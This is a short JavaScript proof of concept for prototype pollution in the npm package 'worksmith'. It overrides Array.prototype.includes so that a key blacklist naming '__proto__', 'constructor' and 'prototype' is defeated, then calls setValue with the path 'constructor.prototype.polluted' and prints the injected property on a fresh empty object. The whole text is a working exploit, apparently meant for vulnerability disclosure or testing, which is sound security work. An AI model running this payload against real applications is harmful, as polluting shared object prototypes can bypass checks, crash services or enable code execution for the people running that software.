Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const worksmith = require('worksmith');
obj = {};
console.log({}.polluted);
worksmith.setValue({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);